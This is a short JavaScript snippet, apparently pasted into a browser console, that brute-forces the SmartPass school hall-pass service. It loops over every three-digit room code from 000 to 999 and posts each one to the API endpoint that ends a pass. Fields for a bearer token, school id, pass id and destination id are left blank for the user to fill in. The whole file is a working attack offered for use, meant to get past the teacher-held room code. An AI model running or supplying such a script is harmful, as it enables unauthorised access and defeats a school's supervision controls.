{
  let bearer = ""
  let school_id = ""
  let pass_id = ""
  let destination_id = ""
  let s = ""
  for (let i = 0; i < 1000; i++) {
    if (i < 10) {
      s = "00" + i
    } else if (i < 100) {
      s = "0" + i
    } else {
      s = "" + i
    }
    fetch("https://smartpass.app/api/prod-us-central/v1/hall_passes/" + pass_id + "/ended", {
      "headers": {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": "Bearer " + bearer,
        "build-date": "Sat Nov 19 07:26:25 UTC 2022",
        "build-release-name": "5a93749c3e9ab8047ddeb4885d9203a0aa674c2e",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryMBwhZ3zmFKKU561u",
        "sec-ch-ua": "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-school-id": school_id
      },
      "referrer": "https://smartpass.app/app/main/passes",
      "referrerPolicy": "strict-origin-when-cross-origin",
      "body": "------WebKitFormBoundaryMBwhZ3zmFKKU561u\r\nContent-Disposition: form-data; name=\"room_code\"\r\n\r\n" + s + "\r\n------WebKitFormBoundaryMBwhZ3zmFKKU561u\r\nContent-Disposition: form-data; name=\"destination_id\"\r\n\r\n" + destination_id + "\r\n------WebKitFormBoundaryMBwhZ3zmFKKU561u--\r\n",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    });
  }
}
